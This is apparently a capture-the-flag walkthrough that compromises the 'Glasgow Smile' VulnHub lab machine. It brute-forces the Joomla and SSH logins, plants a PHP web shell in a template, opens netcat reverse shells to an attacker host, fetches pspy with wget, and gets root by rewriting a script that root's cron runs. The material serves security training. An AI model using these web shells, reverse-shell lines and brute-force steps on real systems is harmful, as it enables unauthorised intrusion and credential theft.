# Glasgow Smile | VulnHub
https://www.vulnhub.com/entry/glasgow-smile-11,491/

### 1. Scan
```bash
Nmap scan report for 192.168.34.152
Host is up, received arp-response (0.00067s latency).
Scanned at 2021-07-16 20:53:56 EDT for 13s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 67:34:48:1f:25:0e:d7:b3:ea:bb:36:11:22:60:8f:a1 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfI+Um/NEmaDpzy9kccx/CHrMEB1l1VDu+tamiGD+VItg0ZxaVs5+5wpu9fOPKBcbCHDMSeJzlPY8RAsqz7LdZkJstARGK4UX6iqWxb2xfu0+PYi+ak7TVxLC+uuSk6ksEVPCb8Zs//bPbYN73yBPZy/0sObvBaJ6yh3pVtn2Q3mA4sPjxrhyHLOir7tUwoS9YDAYF9DAuFJQ9rbJUxPQbKzL4TbHUlVdhaYzXdFub8b8odfkWfocR1h5lOuZfbRgJ16FuFcKBOuKhYmtrkEu/JB5iQ3OYa49+2K54taG0Y/BAAz/IvirKzjGZSSYvjidq1YfmZia1hdwbh+nHihjX
|   256 4c:8c:45:65:a4:84:e8:b1:50:77:77:a9:3a:96:06:31 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBM7oM844qWsqok8aAaJB28sBlnpE9KMEwRDbg7kZNyS9kCf8svDP3OsveL5PQ0rHxQLmZAzxa5dynzdkakLa7qk=
|   256 09:e9:94:23:60:97:f7:20:cc:ee:d6:c1:9b:da:18:8e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKwY1QTfngVJBfVu3KsoMP03LfmxKX8BeLgjBefIf2zN
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
MAC Address: 00:0C:29:67:98:46 (VMware)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/16%OT=22%CT=1%CU=36593%PV=Y%DS=1%DC=D%G=Y%M=000C29%T
OS:M=60F22A31%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=Z%II=I
OS:%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O
OS:5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6
OS:=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O
OS:%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=40%CD=S)

Uptime guess: 3.942 days (since Mon Jul 12 22:17:01 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.67 ms 192.168.34.152

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 16 20:54:09 2021 -- 1 IP address (1 host up) scanned in 15.08 seconds
```
The machine is running SSH and an Apache web server.

### 2. Enumeration
Run a directory search and find a joomla directory.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ dirsearch -u http://192.168.34.152/ -x 403 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-07-16_20-57-28.log

Target: http://192.168.34.152/

Output File: /home/kali/Extra-Tools/dirsearch/reports/192.168.34.152/_21-07-16_20-57-28.txt

[20:57:28] Starting: 
[20:57:46] 200 -  125B  - /index.html
[20:57:47] 301 -  317B  - /joomla  ->  http://192.168.34.152/joomla/                                    
[20:57:47] 301 -  331B  - /joomla/administrator  ->  http://192.168.34.152/joomla/administrator/
[20:57:48] 200 -   10KB - /joomla/                                                                    
                                                                                                                  
Task Completed
```

Going to the /joomla directory, it is a jooma blog called "Joker" with one post with quotes from the 2019 Joker movie. Next, find the Jooma version by visiting http://192.168.34.152/joomla/administrator/manifests/files/joomla.xml.
```xml
<extension version="3.6" type="file" method="upgrade">
<name>files_joomla</name>
<author>Joomla! Project</author>
<authorEmail>admin@joomla.org</authorEmail>
<authorUrl>www.joomla.org</authorUrl>
<copyright>
(C) 2005 - 2017 Open Source Matters. All rights reserved
</copyright>
<license>
GNU General Public License version 2 or later; see LICENSE.txt
</license>
<version>3.7.3-rc1</version>
<creationDate>June 2017</creationDate>
```

The version is 3.7.3rc1, which is fairly new. Next, fuzz plugins.
```bash
┌──(kali㉿kali)-[]-[/usr/…/seclists/Discovery/Web-Content/CMS]
└─$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/CMS/joomla-plugins.fuzz.txt -u "http://192.168.34.152/joomla/FUZZ" 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.34.152/joomla/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/CMS/joomla-plugins.fuzz.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

components/com_contact/ [Status: 200, Size: 2402, Words: 149, Lines: 24]
components/com_newsfeeds/ [Status: 200, Size: 2010, Words: 125, Lines: 22]
components/com_search/  [Status: 200, Size: 1802, Words: 113, Lines: 21]
components/com_media/   [Status: 200, Size: 1002, Words: 65, Lines: 17]
components/com_users/   [Status: 200, Size: 2198, Words: 137, Lines: 23]
components/com_mailto/  [Status: 200, Size: 1804, Words: 113, Lines: 21]
components/com_wrapper/ [Status: 200, Size: 1815, Words: 113, Lines: 21]
components/com_wrapper/ [Status: 200, Size: 1815, Words: 113, Lines: 21]
components/com_wrapper/ [Status: 200, Size: 1815, Words: 113, Lines: 21]
modules/mod_articles_category/ [Status: 200, Size: 1671, Words: 102, Lines: 20]
modules/mod_articles_archive/ [Status: 200, Size: 1665, Words: 101, Lines: 20]
modules/mod_banners/    [Status: 200, Size: 1611, Words: 101, Lines: 20]
modules/mod_articles_news/ [Status: 200, Size: 1647, Words: 101, Lines: 20]
modules/mod_articles_popular/ [Status: 200, Size: 1665, Words: 101, Lines: 20]
modules/mod_articles_latest/ [Status: 200, Size: 1659, Words: 101, Lines: 20]
modules/mod_custom/     [Status: 200, Size: 1404, Words: 89, Lines: 19]
modules/mod_breadcrumbs/ [Status: 200, Size: 1635, Words: 101, Lines: 20]
modules/mod_login/      [Status: 200, Size: 1599, Words: 101, Lines: 20]
modules/mod_feed/       [Status: 200, Size: 1593, Words: 101, Lines: 20]
modules/mod_menu/       [Status: 200, Size: 1593, Words: 101, Lines: 20]
modules/mod_footer/     [Status: 200, Size: 1404, Words: 88, Lines: 19]
modules/mod_related_items/ [Status: 200, Size: 1647, Words: 100, Lines: 20]
modules/mod_random_image/ [Status: 200, Size: 1641, Words: 101, Lines: 20]
modules/mod_search/     [Status: 200, Size: 1605, Words: 101, Lines: 20]
modules/mod_syndicate/  [Status: 200, Size: 1623, Words: 102, Lines: 20]
modules/mod_stats/      [Status: 200, Size: 1599, Words: 101, Lines: 20]
modules/mod_wrapper/    [Status: 200, Size: 1611, Words: 100, Lines: 20]
modules/mod_users_latest/ [Status: 200, Size: 1641, Words: 101, Lines: 20]
modules/mod_whosonline/ [Status: 200, Size: 1629, Words: 101, Lines: 20]
components/com_content/ [Status: 200, Size: 2206, Words: 136, Lines: 23]
components/com_banners/ [Status: 200, Size: 1810, Words: 114, Lines: 21]
:: Progress: [224/224] :: Job [1/1] :: 2184 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```
After a bit of research there is no custom plugins here by the looks of things.

### 3. Attack the login
Generate a wordlist of passwords using the main page with the post on it. I also create a user.txt userlist with some possible users. 
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cewl http://192.168.34.152/joomla > wordlist.txt
                                                                                                                                                                                                                                                                  
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cewl http://192.168.34.152/joomla --lowercase >> wordlist.txt

┌──(kali㉿kali)-[]-[~/Desktop]
└─$ vim users.txt                                           
                                                                                                                                                                                                                                                                  
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ cat users.txt                                                
admin
joomla
joker
```

From this, write a script to bruteforce the login page credentials (see joomla-login.py).
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ./login.py  
First request returned: 200
[+] Attempts: 0 - Current: you
[+] Attempts: 10 - Current: and
[+] Attempts: 20 - Current: You
[+] Attempts: 30 - Current: Glasgow
[+] Attempts: 40 - Current: here
[+] Attempts: 50 - Current: Details
[+] Attempts: 60 - Current: they
[+] Attempts: 70 - Current: not
[+] Attempts: 80 - Current: over
[+] Attempts: 90 - Current: spread
[+] Creds found: joomla:Gotham
```
Creds are recovered as `joomla:Gotham`

### 4. Login to Joomla
The Joomla administration panel can be logged into, and it is seen the "joomla" user is the Super User. This means we can modify a template to give PHP code execution. Injecting a basic `echo shell_exec('id');` into the index.php code displays `uid=33(www-data) gid=33(www-data) groups=33(www-data)` at the top of the joomla page. Change the code to `echo shell_exec($_REQUEST['cmd']);` and now it is possible to execute any command on the system through a parameter.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl 'http://192.168.34.152/joomla/index.php?cmd=whoami' -s 2>/dev/null | head -n 1
www-data
```

### 5. Get a shell
Curl a request to open a reverse shell using Netcat.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl 'http://192.168.34.152/joomla/index.php?cmd=nc%20-e%20/bin/bash%20192.168.34.138%209999' -s 2>/dev/null | head -n 1
```

Get the shell.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999           
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.152] 60886
python -c "import pty;pty.spawn('/bin/bash')"
www-data@glasgowsmile:/var/www/html/joomla$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### 6. Enumerate from user
Check out the Joomla configuration:
```bash
www-data@glasgowsmile:/var/www/html/joomla$ cat configuration.php 
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Joker';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'joomla';
        public $password = 'babyjoker';
        public $db = 'joomla_db';
```
There is a password for the database in here: `babyjoker`. Using the creds, log in and take a look.
```bash
www-data@glasgowsmile:/var/www/html/joomla$ mysql -u joomla -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 10723
Server version: 10.3.22-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| batjoke            |
| information_schema |
| joomla_db          |
| mysql              |
| performance_schema |
+--------------------+
5 rows in set (0.006 sec)

MariaDB [(none)]> use batjoke; show tables;
+-------------------+
| Tables_in_batjoke |
+-------------------+
| equipment         |
| taskforce         |
+-------------------+
2 rows in set (0.001 sec)

MariaDB [batjoke]> select * from equipment; select * from taskforce;
Empty set (0.000 sec)

+----+---------+------------+---------+----------------------------------------------+
| id | type    | date       | name    | pswd                                         |
+----+---------+------------+---------+----------------------------------------------+
|  1 | Soldier | 2020-06-14 | Bane    | YmFuZWlzaGVyZQ==                             |
|  2 | Soldier | 2020-06-14 | Aaron   | YWFyb25pc2hlcmU=                             |
|  3 | Soldier | 2020-06-14 | Carnage | Y2FybmFnZWlzaGVyZQ==                         |
|  4 | Soldier | 2020-06-14 | buster  | YnVzdGVyaXNoZXJlZmY=                         |
|  6 | Soldier | 2020-06-14 | rob     | Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/ |
|  7 | Soldier | 2020-06-14 | aunt    | YXVudGlzIHRoZSBmdWNrIGhlcmU=                 |
+----+---------+------------+---------+----------------------------------------------+
6 rows in set (0.000 sec)
```
Exit and check out /etc/passwd real quick:
```bash
www-data@glasgowsmile:/var/www/html/joomla$ grep bash /etc/passwd
root:x:0:0:root:/root:/bin/bash
rob:x:1000:1000:rob,,,:/home/rob:/bin/bash
abner:x:1001:1001:Abner,,,:/home/abner:/bin/bash
penguin:x:1002:1002:Penguin,,,:/home/penguin:/bin/bash
```
Decoding each of these base64 chunks, they give the following creds:
- `Bane:baneishere`
- `Aaron:aaronishere`
- `Carnage:carnageishere`
- `buster:busterishereff`
- `rob:???AllIHaveAreNegativeThoughts???`
- `aunt:auntis the fuck here`

### 7. Attack SSH
With these passwords and the users from /etc/passwd, launch a password guess attack on SSH. Supply a users.txt file with each of the above users in it, and all the passwords in a seperate passwords.txt file to try all combinations in case there is reuse anywhere.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ hydra -L users.txt -P passwords.txt -e nsr -s 22 ssh://192.168.34.152 -t 4
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-07-16 23:04:02
[DATA] max 4 tasks per 1 server, overall 4 tasks, 36 login tries (l:4/p:9), ~9 tries per task
[DATA] attacking ssh://192.168.34.152:22/
[22][ssh] host: 192.168.34.152   login: rob   password: ???AllIHaveAreNegativeThoughts???
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-07-16 23:04:27
```
The credentials `rob:???AllIHaveAreNegativeThoughts???` are valid for SSH.

### 8. Switch to rob
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh rob@192.168.34.152         
The authenticity of host '192.168.34.152 (192.168.34.152)' can't be established.
ECDSA key fingerprint is SHA256:05TCY2Nw37yPYIluFAe7y4vTCupftlAxY+jXZsTJu88.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.34.152' (ECDSA) to the list of known hosts.
rob@192.168.34.152's password: 
Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun 16 13:24:25 2020 from 192.168.10.172
rob@glasgowsmile:~$ id
uid=1000(rob) gid=1000(rob) groups=1000(rob),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
```

### 9. Enumerate from user
There are some files in the user's directory.
```bash
rob@glasgowsmile:~$ ls -l
total 12
-rw-r----- 1 rob rob 454 Jun 14  2020 Abnerineedyourhelp
-rw-r----- 1 rob rob 313 Jun 14  2020 howtoberoot
-rw-r----- 1 rob rob  38 Jun 13  2020 user.txt
rob@glasgowsmile:~$ cat Abnerineedyourhelp 
Gdkkn Cdzq, Zqsgtq rteedqr eqnl rdudqd ldmszk hkkmdrr ats vd rdd khsskd rxlozsgx enq ghr bnmchshnm. Sghr qdkzsdr sn ghr eddkhmf zants adhmf hfmnqdc. Xnt bzm ehmc zm dmsqx hm ghr intqmzk qdzcr, "Sgd vnqrs ozqs ne gzuhmf z ldmszk hkkmdrr hr odnokd dwodbs xnt sn adgzud zr he xnt cnm's."
Mnv H mddc xntq gdko Zamdq, trd sghr ozrrvnqc, xnt vhkk ehmc sgd qhfgs vzx sn rnkud sgd dmhflz. RSLyzF9vYSj5aWjvYFUgcFfvLCAsXVskbyP0aV9xYSgiYV50byZvcFggaiAsdSArzVYkLZ==
rob@glasgowsmile:~$ cat howtoberoot 
  _____ ______   __  _   _    _    ____  ____  _____ ____  
 |_   _|  _ \ \ / / | | | |  / \  |  _ \|  _ \| ____|  _ \ 
   | | | |_) \ V /  | |_| | / _ \ | |_) | | | |  _| | |_) |
   | | |  _ < | |   |  _  |/ ___ \|  _ <| |_| | |___|  _ < 
   |_| |_| \_\|_|   |_| |_/_/   \_\_| \_\____/|_____|_| \_\

NO HINTS.
```

Stick that rotated text into Cyberchef and get the plaintext message back.
  
*Hello Dear, Arthur suffers from severe mental illness but we see little sympathy for his condition. This relates to his feeling about being ignored. You can find an entry in his journal reads, "The worst part of having a mental illness is people expect you to behave as if you don't."
Now I need your help Abner, use this password, you will find the right way to solve the enigma. STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==*
  
```bash
rob@glasgowsmile:~$ echo "STMzaG9wZTk5bXkwZGVhdGgwMDBtYWtlczQ0bW9yZThjZW50czAwdGhhbjBteTBsaWZlMA==" | base64 -d
I33hope99my0death000makes44more8cents00than0my0life0
```

### 10. Switch to abner
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ ssh abner@192.168.34.152                                               
abner@192.168.34.152's password: 
Linux glasgowsmile 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jun 16 13:20:04 2020 from 192.168.10.172
abner@glasgowsmile:~$ id
uid=1001(abner) gid=1001(abner) groups=1001(abner)
```

### 11. Enumerate from user
More files in this user's home.
```bash
abner@glasgowsmile:~$ ls -l
total 8
-rw-r----- 1 abner abner 565 Jun 16  2020 info.txt
-rw-r----- 1 abner abner  38 Jun 16  2020 user2.txt
abner@glasgowsmile:~$ cat info.txt 
A Glasgow smile is a wound caused by making a cut from the corners of a victim's mouth up to the ears, leaving a scar in the shape of a smile.
The act is usually performed with a utility knife or a piece of broken glass, leaving a scar which causes the victim to appear to be smiling broadly.
The practice is said to have originated in Glasgow, Scotland in the 1920s and 30s. The attack became popular with English street gangs (especially among the Chelsea Headhunters, a London-based hooligan firm, among whom it is known as a "Chelsea grin" or "Chelsea smile").
```
Check out the user's bash history file.
```bash
abner@glasgowsmile:~$ cat .bash_history 
whoami
systemctl reboot
fuck
su penguin
mysql -u root -p
exit
cd .bash/
ls
unzip .dear_penguins.zip
cat dear_penguins
rm dear_penguins
exit
ls
cd /home/abner/
ls
exit
```
So there is a file somewhere called dear_penguins.zip? After some searching, it's eventually found.
```bash
abner@glasgowsmile:/$ find / -name *penguins* 2>/dev/null
/var/www/joomla2/administrator/manifests/files/.dear_penguins.zip
abner@glasgowsmile:/tmp$ unzip dear_penguins.zip 
Archive:  dear_penguins.zip
[dear_penguins.zip] dear_penguins password:
```
Great, it needs a password. After trying a few of the previously-discovered passwords, the "abner" user's password `I33hope99my0death000makes44more8cents00than0my0life0` works.
```bash
[dear_penguins.zip] dear_penguins password: 
  inflating: dear_penguins           
abner@glasgowsmile:/tmp$ cat dear_penguins
My dear penguins, we stand on a great threshold! It's okay to be scared; many of you won't be coming back. Thanks to Batman, the time has come to punish all of God's children! First, second, third and fourth-born! Why be biased?! Male and female! Hell, the sexes are equal, with their erogenous zones BLOWN SKY-HIGH!!! FORWAAAAAAAAAAAAAARD MARCH!!! THE LIBERATION OF GOTHAM HAS BEGUN!!!!!
scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz
```
That last string is a possible password.

### 12. Switch to penguin
```bash
abner@glasgowsmile:/tmp$ su - penguin
Password: 
penguin@glasgowsmile:~$ id
uid=1002(penguin) gid=1002(penguin) groups=1002(penguin)
```

### 13. Enumerate from user
Check out files in Penguins directory.
```bash
penguin@glasgowsmile:~$ ls
SomeoneWhoHidesBehindAMask
penguin@glasgowsmile:~$ cd SomeoneWhoHidesBehindAMask; ls
find  PeopleAreStartingToNotice.txt  user3.txt
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat PeopleAreStartingToNotice.txt 
Hey Penguin,
I'm writing software, I can't make it work because of a permissions issue. It only runs with root permissions. When it's complete I'll copy it to this folder.

Joker
```
The "find" binary is a SUID. Let's see what it is.
```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ chmod +x find
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ./find
.
./user3.txt
./find
./PeopleAreStartingToNotice.txt
./.trash_old
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ./find --help
Usage: ./find [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]
```

This is literally just the unix "find" binary with the suid bit set.

### 14. Fail to escalate to root
Find allows for command execution with the -exec flag, in theory this should allow escalation to root, but it appears as though this functionality does not work (probably modified somehow to prevent it?).
```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ./find user3.txt -exec /bin/sh \;
$ id
uid=1002(penguin) gid=1002(penguin) groups=1002(penguin)
```

### 15. Keep looking
Also in the user's directory is another script called .trash_old.
```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
total 332
drwxr--r-- 2 penguin penguin   4096 Jun 16  2020 .
drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
-rwsr-x--x 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rwxr-xr-x 1 penguin root       612 Jun 16  2020 .trash_old
-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat ./.trash_old 
#/bin/sh

#       (            (              )            (      *    (   (
# (      )\ )   (     )\ ) (      ( /( (  (       )\ ) (  `   )\ ))\ )
# )\ )  (()/(   )\   (()/( )\ )   )\()))\))(   ' (()/( )\))( (()/(()/( (
#(()/(   /(_)((((_)(  /(_)(()/(  ((_)\((_)()\ )   /(_)((_)()\ /(_)/(_)))\
# /(_))_(_))  )\ _ )\(_))  /(_))_  ((__(())\_)() (_)) (_()((_(_))(_)) ((_)
#(_)) __| |   (_)_\(_/ __|(_)) __|/ _ \ \((_)/ / / __||  \/  |_ _| |  | __|
#  | (_ | |__  / _ \ \__ \  | (_ | (_) \ \/\/ /  \__ \| |\/| || || |__| _|
#   \___|____|/_/ \_\|___/   \___|\___/ \_/\_/   |___/|_|  |_|___|____|___|
#

#

 
exit 0
```
Whoops, I deleted it. Hopefully this doesn't screw anything up (it doesn't appear to)!!
```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ rm .trash_old 
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ls -la
total 328
drwxr--r-- 2 penguin penguin   4096 Jul 16 22:38 .
drwxr-xr-x 5 penguin penguin   4096 Jun 16  2020 ..
-rwsr-x--x 1 penguin penguin 315904 Jun 15  2020 find
-rw-r----- 1 penguin root      1457 Jun 15  2020 PeopleAreStartingToNotice.txt
-rw-r----- 1 penguin penguin     38 Jun 16  2020 user3.txt
```
I checked out the public cron files, but don't see anything out of the ordinary. If this script is being ran in the root's crontab it won't show up normally. Can instead use pspy to inspect file events and see if this script is being used for anything.

```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ wget http://192.168.34.138/pspy64
--2021-07-16 22:41:11--  http://192.168.34.138/pspy64
Connecting to 192.168.34.138:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3078592 (2.9M) [application/octet-stream]
Saving to: ‘pspy64’

pspy64                                                     100%[=====================================================================================================================================>]   2.94M  --.-KB/s    in 0.04s   

2021-07-16 22:41:12 (75.6 MB/s) - ‘pspy64’ saved [3078592/3078592]

penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ chmod +x pspy64 
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ ./pspy64 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
...
2021/07/16 22:41:27 CMD: UID=0    PID=1      | /sbin/init 
2021/07/16 22:42:01 CMD: UID=0    PID=15313  | /usr/sbin/CRON -f 
2021/07/16 22:42:01 CMD: UID=0    PID=15314  | /usr/sbin/CRON -f                                                                                                                                                                         
2021/07/16 22:42:01 CMD: UID=0    PID=15315  | /bin/sh -c /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old 
```
There is a cron job running as root and running this script (or trying and failing to do it now since I deleted it).

### 16. Escalate to root for real
Start up a listener, and then create the file with a Netcat reverse shell.
```bash
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ cat /home/penguin/SomeoneWhoHidesBehindAMask/.trash_old
#!/bin/sh

nc -e /bin/sh 192.168.34.138 9999
penguin@glasgowsmile:~/SomeoneWhoHidesBehindAMask$ chmod 777 .trash_old
```

Wait a few minutes for the cron to fire.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.152] 60898
python -c "import pty;pty.spawn('/bin/bash')"
root@glasgowsmile:~# whoami
whoami
root
```